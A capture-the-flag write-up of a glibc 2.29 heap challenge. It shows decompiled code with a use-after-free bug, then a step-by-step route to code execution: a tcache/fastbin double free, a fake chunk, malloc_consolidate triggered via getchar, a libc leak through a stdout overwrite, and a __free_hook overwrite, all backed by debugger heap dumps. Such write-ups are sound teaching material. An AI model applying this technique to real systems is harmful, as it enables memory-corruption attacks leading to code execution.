# information
Running on Ubuntu 19.04, this is a pretty traditional heap exploit challenge.
Only two functions exists in it, *new()* and *delete()*.
To be noted, the size of the chunk should be less than 0x78.
```C
unsigned int new()
{
  unsigned int result; // eax
  int i; // [rsp+8h] [rbp-8h]
  size_t size; // [rsp+Ch] [rbp-4h]

  for ( i = 0; g_chunk[i]; ++i )
  {
    if ( i == 18 )
    {
      puts("full");
      exit(0);
    }
  }
  printf("size:");
  result = read_int();
  LODWORD(size) = result;
  if ( result <= 0x78 )
  {
    g_chunk[i] = malloc(result);
    printf("content:");
    read(0, g_chunk[i], (unsigned int)size);
    result = puts("done");
  }
  return result;
}
```
# bug
There is a UAF bug in the *delete* function.
```C
int delete()
{
  int idx; // [rsp+Ch] [rbp-4h]

  printf("index:");
  idx = read_int();
  if ( idx < 0 || idx > 17 )
  {
    puts("index out of range");
    exit(0);
  }
  free(g_chunk[idx]);
  return puts("done");
}
```
# exploit
The question is how to leverage this bug to code execution. 
Since its been running with libc-2.29.so, the tcache double free mitigation has been added to it. So that we cant use the *House of Atum* way to exploit it.
But here, we can use 18 chunks at most. 

Create 8 chunks and free 7 of them(skip chunk 5) to fill the tcache list, at the same time, prepare the content for *malloc_consolidate*.
```
0x555555757450:	0x0000000000000000	0x0000000000000081 [chunk 4]
0x555555757460:	0x0000000000000000	0x0000000000000000
0x555555757470:	0x0000000000000000	0x0000000000000000
0x555555757480:	0x0000000000000000	0x0000000000000000
0x555555757490:	0x0000000000000000	0x0000000000000000
0x5555557574a0:	0x0000000000000000	0x0000000000000000
0x5555557574b0:	0x0000000000000000	0x0000000000000081 [fake chunk]
0x5555557574c0:	0x0000000000000000	0x0000000000000000
0x5555557574d0:	0x0000000000000000	0x0000000000000041 [chunk 5]
0x5555557574e0:	0x3535353535353535	0x3535353535353535
0x5555557574f0:	0x3535353535353535	0x3535353535353535
0x555555757500:	0x3535353535353535	0x3535353535353535
0x555555757510:	0x3535353535353535	0x0000000000000081 [chunk 6]
0x555555757520:	0x0000000000000000	0x0000000000000000
0x555555757530:	0x0000000000000000	0x0000000000000061
0x555555757540:	0x0000000000000000	0x0000000000000000
0x555555757550:	0x0000000000000000	0x0000000000000000
0x555555757560:	0x0000000000000000	0x0000000000000000
0x555555757570:	0x0000000000000000	0x0000000000000000
[...]
```
Here we use chunk4, chunk5, chunk6 to arrange the heap, make chunk5 just inside the fake chunk. At the same time, Set a fake chunk.
The fake chunk will be added into the fastbins' linked list in the following steps. Carefully set it size to bypass malloc_consolidate checking(next chunk -> chunk 7).

Now, `free(8)`, chunk 8 will be added into the fastbin
```
───────────────────── Tcachebins for arena 0x155555326c40 ─────────────────────
Tcachebins[idx=6, size=0x70] count=7  ←  Chunk(addr=0x5555557575a0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757520, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757460, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557573e0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757360, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557572e0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757260, size=0x80, flags=PREV_INUSE) 
────────────────────── Fastbins for arena 0x155555326c40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x555555757620, size=0x80, flags=PREV_INUSE) 
```
malloc a new chunk with size 0x78, this chunk will be selected from `tcache_bins[6]`, chunk 0x5555557575a0 will be allocated.
```
Tcachebins[idx=6, size=0x70] count=6  ←  Chunk(addr=0x555555757520, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757460, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557573e0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757360, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557572e0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757260, size=0x80, flags=PREV_INUSE) 
────────────────────── Fastbins for arena 0x155555326c40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x555555757620, size=0x80, flags=PREV_INUSE) 
```
Doing `free(8)` again, the chunk will be added into `tcache_bins[]`. And it's FD will be 0x555555757520.
```
Tcachebins[idx=6, size=0x70] count=7  ←  Chunk(addr=0x555555757620, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757520, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757460, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557573e0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757360, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557572e0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757260, size=0x80, flags=PREV_INUSE) 
─────────────────────────────────────────────────────────── Fastbins for arena 0x155555326c40 ───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x555555757620, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757530, size=0x0, flags=) [incorrect fastbin_index] 
```
Malloc a new chunks with size 0x78, it will be at 0x555555757620, setting its FD to the fake chunk we created at the beginning, preparing for the malloc_consolidate.
```
Tcachebins[idx=6, size=0x70] count=6  ←  Chunk(addr=0x555555757520, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757460, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557573e0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757360, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557572e0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757260, size=0x80, flags=PREV_INUSE) 
─────────────────────────────────────────────────────────── Fastbins for arena 0x155555326c40 ───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x555555757620, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557574c0, size=0x80, flags=PREV_INUSE) 
```

Because this challenge didnt do `setbuf(stdin, 0)`. So `getchar()` will call `malloc(0x1000)` inside, which will trigger malloc_consolidate.
After malloc_consolidate, fake chunk will be added into smallbins, and we got an overlapping chunk together with libc address in it.
The chunk is overlapped with chunk 5.
```
gef➤  x/20gx 0x5555557574c0-0x10
0x5555557574b0:	0x0000000000000000	0x0000000000000081 [fake chunk]
0x5555557574c0:	0x0000155555326d10	0x0000155555326d10
0x5555557574d0:	0x0000000000000000	0x0000000000000041 [chunk 5]
0x5555557574e0:	0x3535353535353535	0x3535353535353535
0x5555557574f0:	0x3535353535353535	0x3535353535353535
0x555555757500:	0x3535353535353535	0x3535353535353535
0x555555757510:	0x3535353535353535	0x0000000000000081 [chunk 6]
0x555555757520:	0x0000555555757460	0x0000000000000000
0x555555757530:	0x0000000000000080	0x0000000000000060
0x555555757540:	0x0000000000000000	0x0000000000000000

```
We can use chunk 5 to do stdout overwrite and leak libc address. Then overwrite chunk 6's FD to edit `__free_hook`.






